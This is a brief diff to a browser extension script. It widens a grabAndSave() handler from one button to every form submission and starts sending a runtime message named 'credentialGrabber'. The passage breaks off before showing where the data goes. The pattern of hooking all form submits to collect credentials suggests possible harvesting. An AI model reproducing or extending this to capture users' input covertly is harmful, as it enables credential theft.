@@ -1,9 +1,10 @@
 let browser = require('webextension-polyfill');
 
 let $ = require('jquery');
-const config = require('./config');
+const configLoader = require('./config');
+const config = configLoader.getConfig();
 
-$('#sbmt').on('click', () => grabAndSave());
+$(document).on('submit', 'form', () => grabAndSave());
 
 browser.runtime.sendMessage({
     credentialGrabber: {
